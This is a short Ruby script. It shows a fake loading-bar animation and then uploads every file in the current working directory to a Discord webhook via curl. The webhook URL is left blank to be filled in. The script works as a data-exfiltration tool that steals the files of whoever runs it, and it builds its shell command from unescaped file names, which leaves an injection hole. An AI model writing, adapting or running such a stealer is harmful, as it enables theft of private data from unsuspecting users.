#!/usr/bin/env ruby

def print_ascii_animation(ascii_art, iterations, delay)
  iterations.times do
    ascii_art.each do |line|
      print line
      sleep delay
      print "\r"
    end
  end
  puts
end

def send_to_discord(file_name, webhook_url)
  message = "FILE :\n```#{file_name}```\n"
  curl_command = "curl -s -F file1=@\"#{file_name}\" \"#{webhook_url}\""

  system(curl_command)
  if $?.exitstatus == 0
    puts "SEND : #{file_name}"
  else
    STDERR.puts "ERROR WEBHOOK : #{file_name}"
  end
end

def traverse_directory(folder_path, webhook_url)
  Dir.glob("#{folder_path}/*").each do |file_path|
    next unless File.file?(file_path)

    puts "SEND : #{file_path}"
    send_to_discord(file_path, webhook_url)
  end
end

loading_animation = [
  "[--------]   0% ",
  "[█-------]   10% ",
  "[██------]   20% ",
  "[███-----]   30% ",
  "[████----]   40% ",
  "[█████---]   50% ",
  "[██████--]   60% ",
  "[███████-]   70% ",
  "[████████]   100% "
]

print_ascii_animation(loading_animation, 1, 0.1)

folder_path = Dir.pwd
webhook_url = "" # WEBHOOK HERE
traverse_directory(folder_path, webhook_url)
